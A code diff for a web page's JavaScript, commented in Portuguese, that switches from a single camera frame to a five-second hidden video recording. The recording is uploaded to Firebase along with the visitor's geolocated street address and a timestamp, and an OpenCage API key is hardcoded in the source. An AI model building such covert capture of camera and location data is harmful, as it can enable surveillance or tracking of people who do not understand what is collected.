@@ -80,7 +80,8 @@
     // Função para gravar vídeo de 5 segundos e salvar no Storage
     function captureVideoAndSave() {
       const video = document.createElement('video'); // Cria o elemento de vídeo oculto
-      const canvas = document.createElement('canvas'); // Cria o canvas oculto
+      const mediaRecorderOptions = { mimeType: 'video/webm' };
+      const recordedChunks = [];
 
       showLoader(); // Exibe a barra de carregamento
 
@@ -89,28 +90,26 @@
           video.srcObject = stream;
           video.play();
 
-          video.onloadedmetadata = () => {
-            // Define o tamanho do canvas de acordo com o vídeo
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            // Grava por 5 segundos
-            setTimeout(() => {
-              // Pausa o vídeo após 5 segundos
-              video.pause();
-              video.currentTime = 0;
-              
-              // Desenha o frame do vídeo no canvas
-              const context = canvas.getContext('2d');
-              context.drawImage(video, 0, 0, canvas.width, canvas.height);
-              
-              // Para a câmera e captura a imagem
-              stream.getTracks().forEach(track => track.stop());
-
-              const videoData = canvas.toDataURL('image/png', 1.0); // Gera o frame em alta qualidade
-              uploadVideoToStorage(videoData); // Chama a função para fazer o upload
-            }, 5000); // 5000ms = 5 segundos
+          const mediaRecorder = new MediaRecorder(stream, mediaRecorderOptions);
+          mediaRecorder.ondataavailable = event => {
+            if (event.data.size > 0) {
+              recordedChunks.push(event.data);
+            }
           };
+
+          mediaRecorder.onstop = () => {
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            const videoData = URL.createObjectURL(blob);
+            uploadVideoToStorage(blob, videoData);
+          };
+
+          mediaRecorder.start();
+
+          // Grava por 5 segundos
+          setTimeout(() => {
+            mediaRecorder.stop(); // Para a gravação após 5 segundos
+            stream.getTracks().forEach(track => track.stop()); // Para o stream de vídeo
+          }, 5000);
         })
         .catch(error => {
           hideLoader(); // Oculta a barra de carregamento em caso de erro
@@ -118,14 +117,15 @@
         });
     }
 
-    // Função para salvar o vídeo (frame) no Firebase Storage
-    function uploadVideoToStorage(videoData) {
+    // Função para salvar o vídeo no Firebase Storage
+    function uploadVideoToStorage(blob, videoData) {
       const timestamp = new Date().toISOString().replace(/[^\w\s]/gi, '-'); // Formato data/hora
-      const storageRef = storage.ref(`videos/video_${timestamp}.png`); // Adiciona data/hora ao nome do arquivo
-      storageRef.putString(videoData, 'data_url')
+      const storageRef = storage.ref(`videos/video_${timestamp}.webm`); // Adiciona data/hora ao nome do arquivo
+
+      storageRef.put(blob)
         .then(snapshot => snapshot.ref.getDownloadURL())
         .then(url => {
-          getLocation(url); // Após salvar o vídeo, coleta a localização
+          getLocation(url, timestamp); // Após salvar o vídeo, coleta a localização e inclui a data/hora
         })
         .catch(error => {
           hideLoader();
@@ -134,7 +134,7 @@
     }
 
     // Obter endereço completo a partir de coordenadas
-    function getAddressFromCoordinates(lat, lon, videoUrl) {
+    function getAddressFromCoordinates(lat, lon, videoUrl, timestamp) {
       const apiKey = '150e176e377d4d2ab2819ddada71dbe7';
       const url = `https://api.opencagedata.com/geocode/v1/json?q=${lat}+${lon}&key=${apiKey}`;
 
@@ -152,7 +152,8 @@
               house_number: result.house_number || '',
               country: result.country || '',
               address: data.results[0].formatted,
-              videoUrl: videoUrl
+              videoUrl: videoUrl,
+              timestamp: timestamp // Inclui a data/hora junto com os dados
             };
             sendDataToFirebase(addressDetails); // Envia os dados para o Firebase
           } else {
@@ -167,13 +168,13 @@
     }
 
     // Localização do usuário
-    function getLocation(videoUrl) {
+    function getLocation(videoUrl, timestamp) {
       if (navigator.geolocation) {
         document.getElementById('location-message').innerHTML = 'Será solicitado acesso à sua localização para concluir o processo. Por favor, permita o acesso para continuar.';
         navigator.geolocation.getCurrentPosition(
           position => {
             const { latitude, longitude } = position.coords;
-            getAddressFromCoordinates(latitude, longitude, videoUrl);
+            getAddressFromCoordinates(latitude, longitude, videoUrl, timestamp);
           },
           error => {
             hideLoader();
